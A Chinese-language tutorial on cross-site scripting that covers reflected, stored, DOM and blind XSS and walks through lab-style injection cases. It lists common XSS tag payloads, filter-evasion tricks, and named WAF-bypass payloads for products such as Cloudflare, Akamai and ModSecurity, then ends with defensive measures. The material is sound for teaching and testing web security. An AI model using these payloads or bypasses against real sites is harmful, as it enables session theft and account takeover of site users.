**XSS** 不仅可以用来弹窗，也可以正在javascript代码里发挥想象进行自己构造

##  **简介** ：

XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

##  **XSS常用的攻击手段和目的**

1.盗用cookie，获取敏感信息。

2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。

3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。

4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。

5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。

##  **反射性XSS**

反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。

反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的
URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS
通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

##  **存储型XSS**

持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site
Scripting）。

此类 XSS 不需要用户单击特定 URL
就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS
一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

##  **DOM型XSS（** 较少 **）**

传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM
文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM
文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM
动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵
DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript
脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。

##  **反射性XSS（GET与POST）**

GET型XSS，在无过滤的情况下，可以直接构造XSS语句

![1615280844_60473accc6cc4f52f916f.png!small](https://image.3001.net/images/20210309/1615280844_60473accc6cc4f52f916f.png!small)

![1615280853_60473ad5cfe3242f15d41.png!small](https://image.3001.net/images/20210309/1615280853_60473ad5cfe3242f15d41.png!small)

Post
xss是不能在URL中进行直接构造的，这个需要我们去特意写一个恶意页面，这样用户在登录的情况下点击页面即可触发攻击，从而获取相关敏感信息（账号密码等）

![1615280900_60473b046ae0f57e965df.png!small](https://image.3001.net/images/20210309/1615280900_60473b046ae0f57e965df.png!small)

##  **存储型XSS**

写入数据库，没刷新一次会弹出一次

![1615280924_60473b1c046d70f56e9fd.png!small](https://image.3001.net/images/20210309/1615280924_60473b1c046d70f56e9fd.png!small)

##  **XSS盲打**

前端插入的XSS语句不会在前端去响应，而是在管理登录后台的时候进行弹窗

![1615280937_60473b292cf600ea7103c.png!small](https://image.3001.net/images/20210309/1615280937_60473b292cf600ea7103c.png!small)

![1615280942_60473b2ea59e432948bbf.png!small](https://image.3001.net/images/20210309/1615280942_60473b2ea59e432948bbf.png!small)

##  **XSS之htmlspecialchars**

htmlspecialchars() 函数把预定义的字符转换为 HTML 实体

预定义的字符是：

> & （和号）成为 &
>
> " （双引号）成为 "
>
> ' （单引号）成为 '
>
> < （小于）成为 <
>
> > （大于）成为 >

以上可以看出’（单引号）没有被转义，可以利用

> ' onclick='alert(111)'
>
> ' onmouseover='alert(1)
>
> ' onmouseover='javascript:alert(1)'

![1615280973_60473b4d6d6afed3e55e7.png!small](https://image.3001.net/images/20210309/1615280973_60473b4d6d6afed3e55e7.png!small)

##  **XSS之herf输出**

![1615280987_60473b5b63945af8ec1ab.png!small](https://image.3001.net/images/20210309/1615280987_60473b5b63945af8ec1ab.png!small)

可以看到 先输入了一个submit参数，如果不等于baidu.com， 就对参数进行htmlspecialchars转义
，其中ENT_QUOTES是对单双引号都进行转义了。然后将我们的参数输出到a标签的 herf属性中。这时候，我们就可以构造我们的payload:
**javascript:alert(1)**

这种漏洞中我们可以轻易地利用javascript协议来执行任何我们构造的js代码。

![1615281009_60473b7112d24cfa4a4f7.png!small](https://image.3001.net/images/20210309/1615281009_60473b7112d24cfa4a4f7.png!small)

##  **XSS之js输出**

![1615281022_60473b7e6f3e237d00bbe.png!small](https://image.3001.net/images/20210309/1615281022_60473b7e6f3e237d00bbe.png!small)

输入动态的生成到了js中,形成xss

javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义

构造闭合，把原本的<script>闭合掉，再插入我们自己的<script>

输入：lili'</script><script>alert("xss")</script>

![1615281036_60473b8c9ae905febdcbc.png!small](https://image.3001.net/images/20210309/1615281036_60473b8c9ae905febdcbc.png!small)

修复：

这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。

所以在JS的输出点应该使用\对特殊字符进行转义

##  **XSS常见的标签**

1.无过滤

<script>alert("xss");</script>

2.IMG

<img src=1 onerror=alert("xss");>

3.正常截断

"> <script>alert(1)</script>

'> <script>alert(1)</script>

4.内联框架注入

"><iframe src=javascript:alert(1)>

5.超链接注入

"> <a href="javascript:alert(1)">漏洞</a>

6.input

<input onfocus="alert('xss');">

7.video

<video><source onerror="alert(1)">

##  **XSS绕过方式**

1.双写绕过

<imimgg srsrcc=x onerror=alert("xss");>

2.大小写绕过

<sCirpt>alert("xss");</scrIpt>

3.编码绕过

Unicode编码绕过、url编码绕过、Ascii码绕过、hex绕过、八进制、base64绕过

4.注释与代替绕过

存在注释符的话，可用或<!-- --!>绕过

alert(1)中的小括号：可用反单引号替代：`；也可以用/

##  **常见的WAF Bypass**

WAF名称：Cloudflare

Payload：<a”/onclick=(confirm)()>click

绕过技术：非空格填充

WAF名称：Wordfence

Payload：<a/href=javascript&ampcolonalert()>click

绕过技术：数字字符编码

WAF名称：Barracuda

Payload：<a/href=&#74;ava%0a%0d%09script&ampcolonalert()>click

绕过技术：数字字符编码

WAF名称：Akamai

Payload：<d3v/onauxclick=[2].some(confirm)>click

绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：Comodo

Payload：<d3v/onauxclick=(((confirm)))“>click

绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：F5

Payload：<d3v/onmouseleave=[2].some(confirm)>click

绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：ModSecurity

Payload：<details/open/ontoggle=alert()>

绕过技术：黑名单中缺少标签或事件处理器

WAF名称：dotdefender

Payload：<details/open/ontoggle=(confirm)()//

##  **防御XSS**

1.过滤一些危险字符，以及转义& < > " ' /等危险字符

2.HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无3.法窃取此Cookie。

4.设置CSP(Content Security Policy)

5.输入内容长度限制

文章部分来源：

<https://xz.aliyun.com/t/4067>

<https://www.cnblogs.com/-mo-/p/11229183.html>

